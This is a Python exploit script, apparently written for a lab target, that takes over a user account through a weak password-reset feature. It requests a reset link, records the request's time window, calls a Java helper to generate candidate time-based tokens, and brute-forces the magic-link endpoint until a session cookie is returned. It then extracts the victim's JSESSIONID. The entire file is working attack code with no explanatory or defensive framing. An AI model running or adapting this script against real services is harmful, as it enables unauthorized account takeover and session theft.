#!/usr/bin/env python3

import requests 
import traceback
import subprocess
import time
import re

PROXY = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}
TARGET_IP = "192.168.174.234"

def ResetPassword():
    """
    Request password reset for the `randomusername` user
    """
    ReqPassRstUrl = f"http://{TARGET_IP}/generateMagicLink"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    ReqPassRstData = {"username": "randomusername"}
    try:
        # Capture timing with better precision
        epoch_time_milis_start = round(time.time() * 1000 - 300)
        ReqPassRst = requests.post(ReqPassRstUrl, headers=headers, data=ReqPassRstData)
        epoch_time_milis_end = round(time.time() * 1000 + 300)
        
        print(f"[*] Password reset requested for randomusername")
        print(f"[*] Time window: {epoch_time_milis_start} to {epoch_time_milis_end}")
        
        """
        Generate password reset token list
        """
        try:
            GenTknLstCommand = f"java TokenUtil {epoch_time_milis_start} {epoch_time_milis_end} 9"
            print(f"[*] Executing: {GenTknLstCommand}")
            result = subprocess.run(GenTknLstCommand, shell=True, check=True, capture_output=True, text=True)
            print(result.stdout.strip())
            
            """
            Bruteforce the correct password reset token
            """
            print("[*] Starting token spray attack. Standby")
            token_count = 0
            with open("MgkTkns.txt", "r") as file:
                for token in file:
                    token = token.rstrip()
                    token_count += 1
                    if token_count % 100 == 0:
                        print(f"[*] Tested {token_count} tokens...")
                    
                    PassRstCfrmUrl = f"http://{TARGET_IP}/magicLink/{token}"
                    try:
                        PassRstCfrmRes = requests.get(PassRstCfrmUrl, allow_redirects=False)
                        if 'Set-Cookie' in PassRstCfrmRes.headers:
                            print(f"[+] Valid token found: {token}")
                            cookie_header = PassRstCfrmRes.headers['Set-Cookie']
                            print(f"[+] Cookie: {cookie_header}")
                            
                            # Use regex instead of SimpleCookie for more reliable parsing
                            match = re.search(r'JSESSIONID=([^;]+)', cookie_header)
                            if match:
                                JSESSIONID_value = match.group(1)
                                return JSESSIONID_value
                            else:
                                print("[-] Could not extract JSESSIONID from cookie")
                                
                            return None
                            
                    except Exception as e:
                        print(f"[-] Error testing token {token}: {e}")
            
            print(f"[-] No valid token found after testing {token_count} tokens")
            
        except FileNotFoundError as e:
            print("[-] MgkTkns.txt file not found: ", e)
        except subprocess.CalledProcessError as e:
            print("[-] Command failed with return code:", e.returncode)
            if e.stderr:
                print("[-] Error output:", e.stderr)
        except Exception as e:
            print("[-] Unexpected Error: ", e)
            traceback.print_exc()
    except Exception as e:
        print("[-] Error requesting password reset: ", e)
        traceback.print_exc()

if __name__ == "__main__":
    session_id = ResetPassword()
    if session_id:
        print(f"[SUCCESS]  randomusername's Session ID: {session_id}")
    else:
        print("[FAILED] Could not obtain session ID")
